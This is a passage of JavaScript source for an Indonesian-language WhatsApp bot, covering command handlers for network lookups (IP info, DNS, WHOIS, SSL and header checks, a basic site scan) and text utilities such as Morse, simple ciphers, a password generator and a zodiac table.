          `🏗️ Org      : ${d.org||'-'}`
        );
      } catch { reply("❌ Gagal mengambil IP!"); }
      break;
    }

    case "ipinfo": {
      if (!q) { reply("❌ .ipinfo [IP]\nContoh: .ipinfo 8.8.8.8"); break; }
      if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(q.trim())) { reply("❌ Format IP tidak valid!"); break; }
      reply(`🔍 Mencari info IP *${q}*...`);
      try {
        const res = await axios.get(`http://ip-api.com/json/${q.trim()}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query`, { timeout: 8000 });
        const d = res.data;
        if (d.status !== 'success') { reply(`❌ IP tidak valid!\n${d.message||''}`); break; }
        reply(
          `🌐 *IP Info — ${d.query}*\n\n` +
          `🏳️ Negara   : ${d.country}\n` +
          `🏙️ Kota     : ${d.city}, ${d.regionName}\n` +
          `📮 ZIP      : ${d.zip||'-'}\n` +
          `🕐 Timezone : ${d.timezone}\n` +
          `📍 Koordinat: ${d.lat}, ${d.lon}\n` +
          `🏢 ISP      : ${d.isp}\n` +
          `🏗️ Org      : ${d.org||'-'}\n` +
          `🔢 AS       : ${d.as||'-'}\n\n` +
          `_Data dari ip-api.com_`
        );
      } catch { reply("❌ Gagal mengambil info IP!"); }
      break;
    }

    case "dns": {
      if (!q) { reply("❌ .dns [domain]\nContoh: .dns google.com"); break; }
      const dnsDomain = cleanDomain(q);
      reply(`🔍 *DNS Lookup untuk ${dnsDomain}...*`);
      try {
        const results = {};
        try { results.A = (await dns.resolve4(dnsDomain)).slice(0,3).join(', '); } catch {}
        try { const r = await dns.resolve6(dnsDomain); if (r.length) results.AAAA = r.slice(0,2).join(', '); } catch {}
        try { const r = await dns.resolveMx(dnsDomain); if (r.length) results.MX = r.slice(0,3).map(x=>`${x.exchange} (${x.priority})`).join('\n   '); } catch {}
        try { const r = await dns.resolveNs(dnsDomain); if (r.length) results.NS = r.slice(0,4).join(', '); } catch {}
        try { const r = await dns.resolveTxt(dnsDomain); if (r.length) results.TXT = r.slice(0,2).map(x=>x.join('')).join('\n   ').substring(0,100) + '...'; } catch {}
        try { const r = await dns.resolveCname(dnsDomain); if (r.length) results.CNAME = r[0]; } catch {}
        let txt = `🔍 *DNS Lookup — ${dnsDomain}*\n\n`;
        if (results.A)     txt += `📌 A      : ${results.A}\n`;
        if (results.AAAA)  txt += `📌 AAAA   : ${results.AAAA}\n`;
        if (results.CNAME) txt += `🔗 CNAME  : ${results.CNAME}\n`;
        if (results.MX)    txt += `📧 MX     :\n   ${results.MX}\n`;
        if (results.NS)    txt += `🖥️ NS     : ${results.NS}\n`;
        if (results.TXT)   txt += `📝 TXT    :\n   ${results.TXT}\n`;
        if (Object.keys(results).length === 0) txt += "❌ Tidak ada record DNS ditemukan.";
        reply(txt.trim());
      } catch (e) { reply(`❌ DNS lookup gagal: ${e.message}`); }
      break;
    }

    case "rdns": {
      if (!q) { reply("❌ .rdns [IP]\nContoh: .rdns 8.8.8.8"); break; }
      if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(q.trim())) { reply("❌ Format IP tidak valid!"); break; }
      reply(`🔄 *Reverse DNS untuk ${q}...*`);
      try {
        const hostnames = await dns.reverse(q.trim());
        reply(`🔄 *Reverse DNS*\n\n📍 IP      : ${q}\n🌐 Domain  : ${hostnames.join('\n          ')}`);
      } catch (e) { reply(`❌ Reverse DNS gagal: ${e.message}`); }
      break;
    }

    case "whois": {
      if (!q) { reply("❌ .whois [domain]\nContoh: .whois google.com"); break; }
      const whoisDomain = cleanDomain(q);
      reply(`🔍 *WHOIS untuk ${whoisDomain}...*`);
      try {
        const res = await axios.get(`https://who-dat.as93.net/${whoisDomain}`, { timeout: 10000 });
        const d = res.data;
        const reg     = d.registrar?.name || d.registrar || "-";
        const created = d.creation_date?.[0] || d.created_date || "-";
        const expires = d.expiration_date?.[0] || d.expiry_date || "-";
        const updated = d.updated_date?.[0] || "-";
        const status  = Array.isArray(d.status) ? d.status.slice(0,2).join(', ') : (d.status || "-");
        const ns      = Array.isArray(d.name_servers) ? d.name_servers.slice(0,3).join('\n   ') : "-";
        reply(
          `📋 *WHOIS — ${whoisDomain}*\n\n` +
          `🏢 Registrar  : ${reg}\n` +
          `📅 Dibuat     : ${created}\n` +
          `📅 Expired    : ${expires}\n` +
          `📅 Updated    : ${updated}\n` +
          `📊 Status     : ${status}\n` +
          `🖥️ NS         :\n   ${ns}\n\n` +
          `_Data dari who-dat.as93.net_`
        );
      } catch (e) { reply(`❌ WHOIS gagal: ${e.message}`); }
      break;
    }

    case "pinghost": {
      if (!q) { reply("❌ .pinghost [host/IP]\nContoh: .pinghost google.com"); break; }
      const phHost = cleanDomain(q) || q;
      reply(`🏓 *Ping ke ${phHost}...*`);
      try {
        const times = [];
        for (let i = 0; i < 3; i++) {
          const t0 = Date.now();
          await axios.get(`https://${phHost}`, { timeout: 5000, validateStatus: () => true }).catch(() =>
            axios.get(`http://${phHost}`, { timeout: 5000, validateStatus: () => true })
          );
          times.push(Date.now() - t0);
          await new Promise(r => setTimeout(r, 300));
        }
        const avg = Math.round(times.reduce((a,b)=>a+b,0)/times.length);
        reply(
          `🏓 *Ping — ${phHost}*\n\n` +
          `📊 Hasil (3 ping):\n` +
          times.map((t,i) => `   ${i+1}. ${t}ms`).join('\n') + '\n\n' +
          `⚡ Min : *${Math.min(...times)}ms*\n` +
          `📊 Avg : *${avg}ms*\n` +
          `🐢 Max : *${Math.max(...times)}ms*\n\n` +
          `${avg < 200 ? "🟢 Latensi Sangat Baik" : avg < 500 ? "🟡 Latensi Sedang" : "🔴 Latensi Tinggi"}`
        );
      } catch (e) { reply(`❌ Ping gagal: ${e.message}`); }
      break;
    }

    case "cekweb": {
      if (!q) { reply("❌ .cekweb [url]\nContoh: .cekweb google.com"); break; }
      let wUrl = q.trim();
      if (!wUrl.startsWith('http')) wUrl = 'https://' + wUrl;
      reply(`🔍 Mengecek *${wUrl}*...`);
      const wt0 = Date.now();
      try {
        const wRes = await axios.get(wUrl, { timeout: 10000, validateStatus: () => true });
        const wms  = Date.now() - wt0;
        const ws   = wRes.status;
        const wEmoji = ws < 300 ? "🟢" : ws < 400 ? "🟡" : "🔴";
        reply(
          `${wEmoji} *Website Checker*\n\n` +
          `🌐 URL    : ${wUrl}\n` +
          `📊 Status : *${ws}* (${wRes.statusText||'-'})\n` +
          `⏱️ Latency: *${wms}ms*\n` +
          `📋 Server : ${wRes.headers?.server||'-'}\n` +
          `📦 Type   : ${wRes.headers?.['content-type']?.split(';')[0]||'-'}\n\n` +
          `${ws<400?"✅ Website *ONLINE*!":"❌ Website *DOWN* atau error!"}`
        );
      } catch (e) { reply(`🔴 *Website Checker*\n\n🌐 URL : ${wUrl}\n❌ *OFFLINE* / tidak dapat dijangkau\n⏱️ Timeout: ${Date.now()-wt0}ms\n\n${e.message}`); }
      break;
    }

    case "loadtime": {
      if (!q) { reply("❌ .loadtime [url]\nContoh: .loadtime google.com"); break; }
      let ltUrl = q.trim();
      if (!ltUrl.startsWith('http')) ltUrl = 'https://' + ltUrl;
      reply(`⏱️ *Mengukur load time ${ltUrl}...*`);
      try {
        const times = [];
        for (let i = 0; i < 3; i++) {
          const t0 = Date.now();
          await axios.get(ltUrl, { timeout: 15000, validateStatus: () => true });
          times.push(Date.now() - t0);
        }
        const avg = Math.round(times.reduce((a,b)=>a+b,0)/times.length);
        reply(
          `⏱️ *Load Time — ${ltUrl}*\n\n` +
          `📊 Pengukuran (3x):\n` +
          times.map((t,i)=>`   ${i+1}. ${t}ms`).join('\n') + '\n\n' +
          `📊 Rata-rata : *${avg}ms*\n\n` +
          `${avg<1000?"🟢 Sangat Cepat (<1s)":avg<3000?"🟡 Normal (1-3s)":"🔴 Lambat (>3s)"}`
        );
      } catch (e) { reply(`❌ Gagal mengukur: ${e.message}`); }
      break;
    }

    case "pagesize": {
      if (!q) { reply("❌ .pagesize [url]\nContoh: .pagesize google.com"); break; }
      let psUrl = q.trim();
      if (!psUrl.startsWith('http')) psUrl = 'https://' + psUrl;
      reply(`📦 *Mengukur ukuran halaman ${psUrl}...*`);
      try {
        const t0 = Date.now();
        const res = await axios.get(psUrl, { timeout: 15000, validateStatus: () => true, responseType: 'arraybuffer' });
        const ms  = Date.now() - t0;
        const rawSize = res.data.byteLength;
        reply(
          `📦 *Page Size — ${psUrl}*\n\n` +
          `📏 Ukuran    : *${fmtBytes(rawSize)}*\n` +
          `⏱️ Load Time : *${ms}ms*\n` +
          `📋 Type      : ${res.headers?.['content-type']?.split(';')[0]||'-'}\n` +
          `🗜️ Encoding  : ${res.headers?.['content-encoding']||'none'}\n` +
          `📊 HTTP      : ${res.status}\n\n` +
          `${rawSize < 100000 ? "🟢 Ukuran Ringan" : rawSize < 500000 ? "🟡 Ukuran Normal" : "🔴 Ukuran Berat (>500KB)"}`
        );
      } catch (e) { reply(`❌ Gagal: ${e.message}`); }
      break;
    }

    case "responsetime": {
      if (!q) { reply("❌ .responsetime [url]\nContoh: .responsetime https://api.github.com"); break; }
      let rtUrl = q.trim();
      if (!rtUrl.startsWith('http')) rtUrl = 'https://' + rtUrl;
      reply(`⚡ *Mengukur response time ${rtUrl}...*`);
      try {
        const times = []; let lastStatus = 0;
        for (let i = 0; i < 5; i++) {
          const t0 = Date.now();
          const res = await axios.get(rtUrl, { timeout: 10000, validateStatus: () => true });
          times.push(Date.now() - t0);
          lastStatus = res.status;
          await new Promise(r => setTimeout(r, 200));
        }
        const avg = Math.round(times.reduce((a,b)=>a+b,0)/times.length);
        reply(
          `⚡ *Response Time — ${rtUrl}*\n\n` +
          `📊 HTTP : ${lastStatus}\n` +
          `📈 Samples (5x):\n` +
          times.map((t,i)=>`   ${i+1}. ${t}ms`).join('\n') + '\n\n' +
          `⚡ Min : *${Math.min(...times)}ms*\n` +
          `📊 Avg : *${avg}ms*\n` +
          `🐢 Max : *${Math.max(...times)}ms*\n\n` +
          `${avg<200?"🟢 Sangat Cepat":avg<500?"🟡 Normal":"🔴 Lambat"}`
        );
      } catch (e) { reply(`❌ Gagal: ${e.message}`); }
      break;
    }

    case "header": {
      if (!q) { reply("❌ .header [url]\nContoh: .header google.com"); break; }
      let hUrl = q.trim();
      if (!hUrl.startsWith('http')) hUrl = 'https://' + hUrl;
      reply(`📋 *Mengambil HTTP headers ${hUrl}...*`);
      try {
        const res = await axios.get(hUrl, { timeout: 10000, validateStatus: () => true });
        const h = res.headers;
        const important = [
          ['Server',          h['server']],
          ['Content-Type',    h['content-type']],
          ['Content-Length',  h['content-length'] ? fmtBytes(parseInt(h['content-length'])) : null],
          ['Cache-Control',   h['cache-control']],
          ['X-Powered-By',    h['x-powered-by']],
          ['Strict-Transport',h['strict-transport-security']?.substring(0,50)],
          ['X-Frame-Options', h['x-frame-options']],
          ['Content-Security',h['content-security-policy']?.substring(0,60)],
          ['Last-Modified',   h['last-modified']],
          ['ETag',            h['etag']]
        ].filter(([,v]) => v);
        let txt = `📋 *HTTP Headers — ${hUrl}*\n\n📊 Status: ${res.status} ${res.statusText||''}\n\n`;
        txt += important.map(([k,v]) => `🔹 ${k}:\n   ${v}`).join('\n');
        if (important.length === 0) txt += "❌ Tidak ada header penting ditemukan.";
        reply(txt);
      } catch (e) { reply(`❌ Gagal: ${e.message}`); }
      break;
    }

    case "sslcheck": {
      if (!q) { reply("❌ .sslcheck [domain]\nContoh: .sslcheck google.com"); break; }
      const sslDomain = cleanDomain(q);
      reply(`🔒 *Mengecek SSL ${sslDomain}...*`);
      try {
        const tls = require('tls');
        let sslInfo = { valid: false, issuer: "N/A", expiry: "N/A", daysLeft: "N/A", subject: "N/A" };
        const tlsSocket = tls.connect({ host: sslDomain, port: 443, rejectUnauthorized: false, timeout: 8000 });
        await new Promise((resolve) => {
          tlsSocket.once('secureConnect', () => {
            const cert = tlsSocket.getPeerCertificate();
            sslInfo.valid    = true;
            sslInfo.issuer   = cert.issuer?.CN || cert.issuer?.O || "Unknown";
            sslInfo.expiry   = new Date(cert.valid_to).toLocaleDateString('id-ID');
            const daysLeft   = Math.ceil((new Date(cert.valid_to) - new Date()) / 86400000);
            sslInfo.daysLeft = daysLeft > 0 ? `${daysLeft} hari` : "⌛ Expired";
            sslInfo.subject  = cert.subject?.CN || "N/A";
            tlsSocket.destroy(); resolve();
          });
          tlsSocket.once('error', () => { tlsSocket.destroy(); resolve(); });
          setTimeout(() => { tlsSocket.destroy(); resolve(); }, 8000);
        });
        const t0 = Date.now();
        const httpRes = await axios.get(`https://${sslDomain}`, { timeout: 8000, validateStatus: () => true }).catch(() => null);
        const ms = Date.now() - t0;
        reply(
          `🔒 *SSL Certificate — ${sslDomain}*\n\n` +
          `✅ Valid     : *${sslInfo.valid ? 'Ya' : 'Tidak'}*\n` +
          (sslInfo.valid ? `🏛️ Issuer   : ${sslInfo.issuer}\n` +
          `🌐 Subject  : ${sslInfo.subject}\n` +
          `📅 Expired  : ${sslInfo.expiry}\n` +
          `⏳ Sisa     : *${sslInfo.daysLeft}*\n` : '') +
          `⏱️ Response  : ${ms}ms\n` +
          `📊 HTTP      : ${httpRes?.status || 'N/A'}\n\n` +
          `_Untuk analisis lengkap: ssllabs.com/ssltest_`
        );
      } catch (e) { reply(`❌ Gagal cek SSL: ${e.message}`); }
      break;
    }

    case "bandwidth": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      reply("⚡ *Testing bandwidth bot server...*");
      try {
        const t0 = Date.now();
        const res = await axios.get("https://speed.cloudflare.com/__down?bytes=2000000", {
          timeout: 20000, responseType: 'arraybuffer'
        });
        const ms   = Date.now() - t0;
        const size = res.data.byteLength;
        const bps  = Math.round((size * 8) / (ms / 1000));
        const mbps = (bps / 1000000).toFixed(2);
        reply(
          `⚡ *Bandwidth Test*\n\n` +
          `📦 Download : ${fmtBytes(size)}\n` +
          `⏱️ Waktu    : ${ms}ms\n\n` +
          `📊 Speed    : *${mbps} Mbps*\n` +
          `📊 Speed    : *${(bps/1000).toFixed(0)} Kbps*\n\n` +
          `${parseFloat(mbps) > 10 ? "🟢 Koneksi Cepat" : parseFloat(mbps) > 1 ? "🟡 Koneksi Sedang" : "🔴 Koneksi Lambat"}\n\n` +
          `_Diukur dari server bot ke Cloudflare_`
        );
      } catch (e) { reply(`❌ Bandwidth test gagal: ${e.message}`); }
      break;
    }

    case "webx": {
      if (!q) { reply("❌ .webx [domain]\nContoh: .webx google.com"); break; }
      let wxDomain = q.trim().toLowerCase();
      wxDomain = wxDomain.replace(/^https?:\/\//,'').replace(/\/.*$/,'').split(':')[0];
      reply(`🔍 *SCANNING:* ${wxDomain}\n⏳ Proses ini 10-20 detik...`);
      try {
        let dnsR = {};
        try {
          const [a, aaaa, mx, ns] = await Promise.all([
            dns.resolve4(wxDomain).catch(()=>[]),
            dns.resolve6(wxDomain).catch(()=>[]),
            dns.resolveMx(wxDomain).catch(()=>[]),
            dns.resolveNs(wxDomain).catch(()=>[])
          ]);
          dnsR = { a, aaaa, mx, ns };
        } catch {}
        const wxIp = dnsR.a?.[0] || "Unknown";
        let geo = {};
        if (wxIp !== "Unknown") {
          try {
            const gR = await axios.get(`http://ip-api.com/json/${wxIp}?fields=status,country,city,region,isp,org`, { timeout: 5000 });
            if (gR.data.status === 'success') geo = gR.data;
          } catch {}
        }
        let wxPing = "N/A";
        try { const s = Date.now(); await axios.get(`https://${wxDomain}`, { timeout: 5000 }); wxPing = `${Date.now()-s}ms`; } catch {}
        let wxHdr = {}; let secScore = 0; const secGood = [];
        try {
          const hR = await axios.get(`https://${wxDomain}`, { timeout: 10000, maxRedirects: 5 });
          wxHdr = hR.headers;
          ['strict-transport-security','x-frame-options','x-content-type-options','x-xss-protection','content-security-policy','referrer-policy','permissions-policy'].forEach(h => {
            if (wxHdr[h]) { secScore++; secGood.push(h.replace(/x-|-security|-policy|-options/g,'').substring(0,10)); }
          });
        } catch {}
        let sslV = false, sslIss = "N/A", sslExp = "N/A";
        try {
          const tls = require('tls');
          const s   = tls.connect({ host: wxDomain, port: 443, rejectUnauthorized: false });
          await new Promise(r => {
            s.once('secureConnect', () => {
              const c = s.getPeerCertificate();
              sslV   = true;
              sslIss = c.issuer?.CN || c.issuer?.O || "Unknown";
              sslExp = new Date(c.valid_to).toLocaleDateString('id-ID');
              s.destroy(); r();
            });
            s.once('error', () => { s.destroy(); r(); });
            setTimeout(() => { s.destroy(); r(); }, 5000);
          });
        } catch {}
        let result =
          `┏━═『 🌐 WEBX SCAN 』━━━━━━━━━\n` +
          `┃ 📍 Target: ${wxDomain}\n` +
          `┃ 🕐 ${moment.tz("Asia/Jakarta").format("HH:mm:ss DD/MM/YYYY")}\n┃\n` +
          `┃ 📡 *DNS*\n` +
          `┃ ├ IP   : ${dnsR.a?.join(', ')||'N/A'}\n` +
          (dnsR.aaaa?.length ? `┃ ├ IPv6 : ${dnsR.aaaa[0]}\n` : '') +
          (dnsR.ns?.length ? `┃ ├ NS   : ${dnsR.ns.slice(0,2).join(', ')}\n` : '') +
          (dnsR.mx?.length ? `┃ ├ MX   : ${dnsR.mx[0].exchange}\n` : '') +
          `┃\n`;
        if (geo.country) {
          result +=
            `┃ 🗺️ *GEO*\n` +
            `┃ ├ ${geo.country} — ${geo.city}\n` +
            `┃ ├ ISP : ${geo.isp}\n┃\n`;
        }
        result +=
          `┃ ⚡ *PERFORMANCE*\n` +
          `┃ ├ Ping : ${wxPing}\n┃\n` +
          `┃ 🔒 *SSL*\n` +
          `┃ ├ Valid  : ${sslV?"✅ Ya":"❌ Tidak"}\n` +
          (sslV ? `┃ ├ Issuer : ${sslIss}\n┃ ├ Expired: ${sslExp}\n` : '') +
          `┃\n` +
          `┃ 🛡️ *SECURITY HEADERS*\n` +
          `┃ ├ Score : ${secScore}/7\n` +
          (secGood.length ? `┃ ├ OK    : ${secGood.join(', ')}\n` : '') +
          (secScore < 4 ? `┃ └ ⚠️ Security headers kurang!\n` : `┃ └ ✅ Security OK!\n`) +
          `┃\n`;
        if (wxHdr.server || wxHdr['x-powered-by']) {
          result += `┃ 💻 *TECH*\n` + (wxHdr.server?`┃ ├ Server: ${wxHdr.server}\n`:'') + (wxHdr['x-powered-by']?`┃ ├ Powered: ${wxHdr['x-powered-by']}\n`:'') + `┃\n`;
        }
        result += `┗━═━═━═━═━═━═━═𖤻`;
        await WaSocket.sendMessage(m.chat, { text: result }, { quoted: x });
      } catch (e) { reply(`❌ Gagal scan: ${e.message}`); }
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  UTILS LANJUTAN
    // ══════════════════════════════════════════════════════════
    case "morse": {
      if (!q) { reply("❌ .morse [teks]"); break; }
      const MENC = { A:'.-',B:'-...',C:'-.-.',D:'-..',E:'.',F:'..-.',G:'--.',H:'....',I:'..',J:'.---',K:'-.-',L:'.-..',M:'--',N:'-.',O:'---',P:'.--.',Q:'--.-',R:'.-.',S:'...',T:'-',U:'..-',V:'...-',W:'.--',X:'-..-',Y:'-.--',Z:'--..',0:'-----',1:'.----',2:'..---',3:'...--',4:'....-',5:'.....',6:'-....',7:'--...',8:'---..',9:'----.',' ':'/' };
      reply(`📡 *Morse*\n\n📥 ${q}\n📤 \`${q.toUpperCase().split('').map(c=>MENC[c]||'?').join(' ')}\``);
      break;
    }

    case "demorse": {
      if (!q) { reply("❌ .demorse [kode morse]"); break; }
      const MDEC = { '.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F','--.':'G','....':'H','..':'I','.---':'J','-.-':'K','.-..':'L','--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q','.-.':'R','...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y','--..':'Z','-----':'0','.----':'1','..---':'2','...--':'3','....-':'4','.....':'5','-....':'6','--...':'7','---..':'8','----.':'9','/':' ' };
      reply(`📡 *Demorse*\n\n📥 \`${q}\`\n📤 *${q.trim().split(' ').map(c=>MDEC[c]||'?').join('')}*`);
      break;
    }

    case "aesthetic": {
      if (!q) { reply("❌ .aesthetic [teks]"); break; }
      const aM = {a:'𝓪',b:'𝓫',c:'𝓬',d:'𝓭',e:'𝓮',f:'𝓯',g:'𝓰',h:'𝓱',i:'𝓲',j:'𝓳',k:'𝓴',l:'𝓵',m:'𝓶',n:'𝓷',o:'𝓸',p:'𝓹',q:'𝓺',r:'𝓻',s:'𝓼',t:'𝓽',u:'𝓾',v:'𝓿',w:'𝔀',x:'𝔁',y:'𝔂',z:'𝔃',A:'𝓐',B:'𝓑',C:'𝓒',D:'𝓓',E:'𝓔',F:'𝓕',G:'𝓖',H:'𝓗',I:'𝓘',J:'𝓙',K:'𝓚',L:'𝓛',M:'𝓜',N:'𝓝',O:'𝓞',P:'𝓟',Q:'𝓠',R:'𝓡',S:'𝓢',T:'𝓣',U:'𝓤',V:'𝓥',W:'𝓦',X:'𝓧',Y:'𝓨',Z:'𝓩'};
      const bM = {a:'𝗮',b:'𝗯',c:'𝗰',d:'𝗱',e:'𝗲',f:'𝗳',g:'𝗴',h:'𝗵',i:'𝗶',j:'𝗷',k:'𝗸',l:'𝗹',m:'𝗺',n:'𝗻',o:'𝗼',p:'𝗽',q:'𝗾',r:'𝗿',s:'𝘀',t:'𝘁',u:'𝘂',v:'𝘃',w:'𝘄',x:'𝘅',y:'𝘆',z:'𝘇',A:'𝗔',B:'𝗕',C:'𝗖',D:'𝗗',E:'𝗘',F:'𝗙',G:'𝗚',H:'𝗛',I:'𝗜',J:'𝗝',K:'𝗞',L:'𝗟',M:'𝗠',N:'𝗡',O:'𝗢',P:'𝗣',Q:'𝗤',R:'𝗥',S:'𝗦',T:'𝗧',U:'𝗨',V:'𝗩',W:'𝗪',X:'𝗫',Y:'𝗬',Z:'𝗭'};
      reply(`✨ *Aesthetic*\n\n🔡 Cursive: ${q.split('').map(c=>aM[c]||c).join('')}\n🔡 Bold   : ${q.split('').map(c=>bM[c]||c).join('')}`);
      break;
    }

    case "bubble": {
      if (!q) { reply("❌ .bubble [teks]"); break; }
      const bM2 = {a:'ⓐ',b:'ⓑ',c:'ⓒ',d:'ⓓ',e:'ⓔ',f:'ⓕ',g:'ⓖ',h:'ⓗ',i:'ⓘ',j:'ⓙ',k:'ⓚ',l:'ⓛ',m:'ⓜ',n:'ⓝ',o:'ⓞ',p:'ⓟ',q:'ⓠ',r:'ⓡ',s:'ⓢ',t:'ⓣ',u:'ⓤ',v:'ⓥ',w:'ⓦ',x:'ⓧ',y:'ⓨ',z:'ⓩ',A:'Ⓐ',B:'Ⓑ',C:'Ⓒ',D:'Ⓓ',E:'Ⓔ',F:'Ⓕ',G:'Ⓖ',H:'Ⓗ',I:'Ⓘ',J:'Ⓙ',K:'Ⓚ',L:'Ⓛ',M:'Ⓜ',N:'Ⓝ',O:'Ⓞ',P:'Ⓟ',Q:'Ⓠ',R:'Ⓡ',S:'Ⓢ',T:'Ⓣ',U:'Ⓤ',V:'Ⓥ',W:'Ⓦ',X:'Ⓧ',Y:'Ⓨ',Z:'Ⓩ','0':'⓪','1':'①','2':'②','3':'③','4':'④','5':'⑤','6':'⑥','7':'⑦','8':'⑧','9':'⑨'};
      reply(`🫧 *Bubble*\n\n${q.split('').map(c=>bM2[c]||c).join('')}`);
      break;
    }

    case "rot13": {
      if (!q) { reply("❌ .rot13 [teks]"); break; }
      const r13 = q.replace(/[a-zA-Z]/g, c => { const b = c<='Z'?65:97; return String.fromCharCode(((c.charCodeAt(0)-b+13)%26)+b); });
      reply(`🔄 *ROT13*\n\n📥 ${q}\n📤 ${r13}`);
      break;
    }

    case "caesar": {
      const cParts2 = q.split(' '); const cShift = parseInt(cParts2[0]); const cTxt = cParts2.slice(1).join(' ');
      if (isNaN(cShift) || !cTxt) { reply("❌ .caesar [shift] [teks]\nContoh: .caesar 3 hello"); break; }
      const cEnc = cTxt.replace(/[a-zA-Z]/g, c => { const b = c<='Z'?65:97; return String.fromCharCode(((c.charCodeAt(0)-b+cShift%26+26)%26)+b); });
      reply(`🔐 *Caesar Cipher*\n\n🔢 Shift  : ${cShift}\n📥 Input  : ${cTxt}\n📤 Output : ${cEnc}`);
      break;
    }

    case "genpass": {
      const gpLen = Math.min(Math.max(parseInt(q)||16,8),64);
      const gpSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}';
      const gpByt = crypto.randomBytes(gpLen); let gpPass = '';
      for (let i=0;i<gpLen;i++) gpPass += gpSet[gpByt[i]%gpSet.length];
      const gpScore = [/[A-Z]/.test(gpPass),/[a-z]/.test(gpPass),/[0-9]/.test(gpPass),/[^A-Za-z0-9]/.test(gpPass)].filter(Boolean).length;
      reply(`🔐 *Password Generator*\n\n🗝️ Password : \`${gpPass}\`\n📏 Panjang  : ${gpLen} karakter\n💪 Kekuatan : ${gpScore===4?"🟢 Sangat Kuat":gpScore===3?"🟡 Kuat":"🔴 Lemah"}\n\n_⚠️ Jangan bagikan password ini!_`);
      break;
    }

    case "xorenc": {
      if (!q || !q.includes('|')) { reply("❌ .xorenc [key]|[teks]"); break; }
      const [xeK, xeT] = q.split('|');
      let xeE = ''; for (let i=0;i<xeT.length;i++) xeE += String.fromCharCode(xeT.charCodeAt(i)^xeK.charCodeAt(i%xeK.length));
      const xeB = Buffer.from(xeE,'binary').toString('base64');
      reply(`🔐 *XOR Encrypt*\n\n🗝️ Key    : \`${xeK}\`\n📥 Input  : ${xeT}\n📤 Output : \`${xeB}\`\n\n_Decrypt: .xordec ${xeK}|${xeB}_`);
      break;
    }

    case "xordec": {
      if (!q || !q.includes('|')) { reply("❌ .xordec [key]|[base64]"); break; }
      const [xdK, xdB] = q.split('|');
      try {
        const xdE = Buffer.from(xdB,'base64').toString('binary'); let xdD = '';
        for (let i=0;i<xdE.length;i++) xdD += String.fromCharCode(xdE.charCodeAt(i)^xdK.charCodeAt(i%xdK.length));
        reply(`🔓 *XOR Decrypt*\n\n🗝️ Key    : \`${xdK}\`\n📥 Input  : \`${xdB}\`\n📤 Output : *${xdD}*`);
      } catch { reply("❌ Data base64 tidak valid!"); }
      break;
    }

    case "lorem": {
      const loremWords = ["lorem","ipsum","dolor","sit","amet","consectetur","adipiscing","elit","sed","do","eiusmod","tempor","incididunt","ut","labore","et","dolore","magna","aliqua","enim","ad","minim","veniam","quis","nostrud","exercitation","ullamco","laboris","nisi","aliquip","ex","ea","commodo","consequat","duis","aute","irure","in","reprehenderit","voluptate","velit","esse","cillum","eu","fugiat","nulla","pariatur"];
      const lCount = Math.min(Math.max(parseInt(q)||5, 1), 20);
      let lResult = '';
      for (let s = 0; s < lCount; s++) {
        const wc = 8 + Math.floor(Math.random()*10);
        const words = Array.from({length:wc}, ()=>loremWords[Math.floor(Math.random()*loremWords.length)]);
        words[0] = words[0].charAt(0).toUpperCase() + words[0].slice(1);
        lResult += words.join(' ') + '. ';
      }
      reply(`📜 *Lorem Ipsum* (${lCount} kalimat)\n\n${lResult.trim()}`);
      break;
    }

    case "countdown": {
      if (!q) { reply("❌ .countdown [DD/MM/YYYY] [event]\nContoh: .countdown 25/12/2025 Natal"); break; }
      const cdP = q.split(' '); const cdDStr = cdP[0]; const cdEv = cdP.slice(1).join(' ')||"Event";
      const [cdd,cdm,cdy] = cdDStr.split('/').map(Number);
      if (!cdd||!cdm||!cdy) { reply("❌ Format tanggal salah!"); break; }
      const cdTarget = new Date(cdy,cdm-1,cdd); const cdDiff = cdTarget - new Date();
      if (cdDiff<=0) { reply(`📅 *${cdEv}* sudah berlalu!`); break; }
      reply(`⏳ *Countdown — ${cdEv}*\n\n📅 Target : ${cdDStr}\n\n┌──────────────────┐\n│ ${String(Math.floor(cdDiff/86400000)).padStart(5)} hari       │\n│ ${String(Math.floor(cdDiff%86400000/3600000)).padStart(5)} jam        │\n│ ${String(Math.floor(cdDiff%3600000/60000)).padStart(5)} menit      │\n│ ${String(Math.floor(cdDiff%60000/1000)).padStart(5)} detik      │\n└──────────────────┘`);
      break;
    }

    case "zodiak": {
      if (!q) { reply("❌ .zodiak [DD/MM]\nContoh: .zodiak 15/08"); break; }
      const [zd,zm] = q.split('/').map(Number);
      if (!zd||!zm) { reply("❌ Format salah! DD/MM"); break; }
      const zList = [
        {name:'♑ Capricorn',  from:[12,22],to:[1,19],  sifat:'Ambisius, disiplin, sabar', lucky:'Sabtu',  color:'Coklat & Hitam'},
        {name:'♒ Aquarius',   from:[1,20], to:[2,18],  sifat:'Inovatif, bebas, humanis',  lucky:'Sabtu',  color:'Biru & Abu'},
        {name:'♓ Pisces',     from:[2,19], to:[3,20],  sifat:'Imajinatif, empati, lembut',lucky:'Kamis',  color:'Hijau Laut'},
        {name:'♈ Aries',      from:[3,21], to:[4,19],  sifat:'Berani, energik, impulsif', lucky:'Selasa', color:'Merah'},
        {name:'♉ Taurus',     from:[4,20], to:[5,20],  sifat:'Stabil, setia, sabar',      lucky:'Jumat',  color:'Hijau & Pink'},
        {name:'♊ Gemini',     from:[5,21], to:[6,20],  sifat:'Komunikatif, adaptif',      lucky:'Rabu',   color:'Kuning'},
        {name:'♋ Cancer',     from:[6,21], to:[7,22],  sifat:'Penuh kasih, intuitif',     lucky:'Senin',  color:'Putih & Silver'},
        {name:'♌ Leo',        from:[7,23], to:[8,22],  sifat:'Percaya diri, loyal',       lucky:'Minggu', color:'Emas & Oranye'},
        {name:'♍ Virgo',      from:[8,23], to:[9,22],  sifat:'Analitis, perfeksionis',    lucky:'Rabu',   color:'Hijau & Coklat'},
        {name:'♎ Libra',      from:[9,23], to:[10,22], sifat:'Adil, sosial, diplomatik',  lucky:'Jumat',  color:'Biru & Pink'},
        {name:'♏ Scorpio',    from:[10,23],to:[11,21], sifat:'Intensif, misterius',       lucky:'Selasa', color:'Merah Tua'},
